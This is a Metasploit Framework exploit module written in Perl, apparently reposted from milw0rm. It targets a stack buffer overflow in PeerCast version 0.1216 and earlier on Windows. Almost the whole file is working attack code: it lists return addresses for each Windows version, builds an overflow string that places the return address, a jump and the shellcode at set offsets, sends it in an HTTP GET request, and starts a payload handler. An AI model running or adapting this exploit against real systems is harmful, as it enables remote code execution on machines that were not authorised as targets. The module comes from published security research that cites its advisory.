##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::peercast_url_win32;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };

my $info =
  {

	'Name'  => 'PeerCast <= 0.1216 URL Handling Buffer Overflow(win32)',
	'Version'  => '$Revision: 1.2 $',
	'Authors' => [ 'H D Moore <hdm [at] metasploit.com>', ],
	'Arch'  => [ 'x86' ],
	'OS'    => [ 'win32' ],
	'Priv'  => 0,
	
	'AutoOpts'	=> { 'EXITFUNC' => 'process' },

	'UserOpts'  =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 7144],
		'SSL'   => [0, 'BOOL', 'Use SSL'],
	  },

	'Payload' =>
	  {
		'Space'     => 400,
		'BadChars'  => "\x00\x0a\x0d\x20\x0d",
		'Keys'      => ['+ws2ord'],
		'Prepend'   => "\x81\xc4\x54\xf2\xff\xff",  # add esp, -3500
	  },

	'Description'  => Pex::Text::Freeform(qq{
	This module exploits a stack overflow in PeerCast <= v0.1216. 
	The vulnerability is caused due to a boundary error within the
	handling of URL parameters.
}),

	'Refs'  =>
	  [
	  	['OSVDB', '23777'],
		['BID', '17040'],
		['URL', 'http://www.infigo.hr/in_focus/INFIGO-2006-03-01'],
	  ],

	'Targets' =>
	  [
		['Windows 2000 English SP0-SP4', 0x75023360 ],
		['Windows 2003 English SP0-SP1', 0x77d099e3 ],
		['Windows XP English SP0/SP1', 0x77dbfa2c],
		['Windows XP English SP0/SP2', 0x77dc12b8],
	  ],

	'Keys' => ['peercast'],

	'DisclosureDate' => 'March 8 2006',
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Exploit
{
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');
	my $offset      = $self->GetVar('OFFSET');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
	my $target = $self->Targets->[$target_idx];

	my $pattern = Pex::Text::AlphaNumText(1024);
	
	# Return to EDI (offset 812)
	substr($pattern, 768, 4, pack('V', $target->[1]));
	
	# Jump back to the shellcode
	substr($pattern, 812, 5, "\xe9".pack("V", -517));
	
	# Insert he payload at offset 300 to avoid corruption
	substr($pattern, 300, length($shellcode), $shellcode);
	
	my $sploit = "GET /stream/?". $pattern ." HTTP/1.0\r\n\r\n";
	$self->PrintLine(sprintf("[*] Trying to exploit target %s 0x%.8x", $target->[0], $target->[1]));

	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );
	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}

	$s->Send($sploit);
	$self->Handler($s);
	$s->Close();
	return;
}

1;

# milw0rm.com [2006-03-30]